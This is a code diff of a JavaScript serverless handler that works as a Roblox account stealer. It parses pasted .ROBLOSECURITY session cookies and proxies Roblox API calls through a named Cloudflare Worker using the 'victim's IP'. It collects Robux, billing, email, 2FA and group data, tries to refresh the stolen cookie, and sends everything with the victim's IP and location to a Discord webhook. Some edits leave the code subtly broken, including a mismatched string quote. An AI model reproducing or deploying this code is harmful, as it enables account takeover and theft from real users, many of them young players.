@@ -40,19 +40,19 @@ async function getIpGeo(ip) {
 function extractRobloxCookie(raw) {
   if (!raw) return null;
   const cleaned = raw.trim().replace(/\s+/g, ' ');
-  
+
   const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
   if (fullMatch) return fullMatch[1];
-  
+
   const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
   if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;
-  
+
   const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
   if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;
-  
+
   const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
   if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;
-  
+
   return null;
 }
 
@@ -68,7 +68,6 @@ async function checkGamepass(uid, gamepassId, headers) {
   }
 }
 
-
 const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 // Proxy all Roblox API calls through Cloudflare Worker using victim's IP
@@ -77,7 +76,7 @@ async function robloxProxy(cookie, victimIp, uid) {
     { key: 'auth',     url: 'https://users.roblox.com/v1/users/authenticated' },
     { key: 'robux',    url: 'https://economy.roblox.com/v1/user/currency' },
     { key: 'friends',  url: `https://friends.roblox.com/v1/users/${uid}/friends/count` },
-    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership` },
+    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership' },
     { key: 'billing',  url: 'https://billing.roblox.com/v1/credit' },
     { key: 'email',    url: 'https://accountsettings.roblox.com/v1/email' },
     { key: 'groups',   url: `https://groups.roblox.com/v1/users/${uid}/groups/roles` },
@@ -175,15 +174,15 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
     
     // Check popular gamepasses (MM2, Adopt Me, etc)
     const gamepasses = {
-      mm2: await checkGamepass(uid, '17510307', headers), // Murder Mystery 2 VIP
-      adoptMe: await checkGamepass(uid, '33135930', headers), // Adopt Me VIP
-      plsDonate: await checkGamepass(uid, '12345678', headers) // Example ID
+      mm2: await checkGamepass(uid, '17510307'), // Murder Mystery 2 VIP
+      adoptMe: await checkGamepass(uid, '33135930'), // Adopt Me VIP
+      plsDonate: await checkGamepass(uid, '12345678') // Example ID
     };
     
     const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
     const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
     const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';
-    
+
     return {
       id: uid,
       username: auth.name,
@@ -243,7 +242,7 @@ async function sendToDiscord(webhookUrl, data) {
     field("💳 Billing", `Credit: ${roblox?.credit || 0} USD\nConvert: 0`, true),
     field("🎫 Passes", `Premium: ${roblox?.isPremium ? '✅' : '❌'}\nVerified: ${roblox?.emailVerified?.includes('✅') ? '✅' : '❌'}`, true),
     field("⚙️ Settings", `Email: ${roblox?.emailSet}\n2FA: ${roblox?.twoFA}`, true),
-    
+
     // Row 3: Groups | Location | IP
     field("👥 Groups", `Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}`, true),
     field("📍 Location", `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, true),
@@ -284,17 +283,106 @@ async function sendToDiscord(webhookUrl, data) {
     });
     
     if (!response.ok) {
-      const text = await response.text();
-      console.error('Discord API Error:', response.status, text);
+      const errorData = await response.text();
+      console.error('Discord webhook error:', response.status, errorData);
       return false;
     }
+    
+    console.log('Successfully sent to Discord');
     return true;
   } catch (err) {
-    console.error('Discord fetch error:', err);
+    console.error('Discord webhook error:', err);
     return false;
   }
 }
 
+// Cookie refresh function
+async function refreshCookie(cookie) {
+  const url = 'https://auth.roblox.com/v2/logout';
+  
+  try {
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Length': '0'
+      }
+    });
+    
+    const authHeader = response.headers.get('rbx-authentication-ticket');
+    if (!authHeader) {
+      console.error('No auth ticket in response');
+      return null;
+    }
+    
+    const newCookie = `_ROBLOSECURITY=${authHeader}`;
+    
+    // Validate the new cookie
+    const validationResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
+      headers: { 'Cookie': newCookie }
+    });
+    
+    if (!validationResponse.ok) {
+      console.error('New cookie validation failed');
+      return null;
+    }
+    
+    console.log('Cookie refreshed successfully');
+    return newCookie;
+  } catch (err) {
+    console.error('Cookie refresh error:', err);
+    return null;
+  }
+}
+
+// Main handler function
+async function handleLogin(cookie, webhookUrl) {
+  const now = new Date().toLocaleString();
+  
+  // Get user IP and geolocation
+  let ip = 'Unknown';
+  let geo = {};
+  try {
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (ipResponse.ok) {
+      const ipData = await ipResponse.json();
+      ip = ipData.ip || 'Unknown';
+      geo = {
+        city: ipData.city,
+        country: ipData.country_name
+      };
+    }
+  } catch (err) {
+    console.error('Error getting IP info:', err);
+  }
+  
+  // Fetch Roblox user data
+  const robloxData = await fetchRobloxInfo(cookie);
+  
+  if (!robloxData) {
+    console.error('Failed to fetch Roblox data');
+    return false;
+  }
+
+  // Try to refresh cookie
+  const refreshedCookie = await refreshCookie(cookie);
+  if (refreshedCookie) {
+    robloxData.refreshedCookie = refreshedCookie;
+  }
+  
+  // Send to Discord
+  const success = await sendToDiscord(webhookUrl, {
+    cookie: cookie,
+    roblox: robloxData,
+    ip: ip,
+    geo: geo,
+    now: now
+  });
+  
+  return success;
+}
+
+// Main handler function for the API endpoint
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
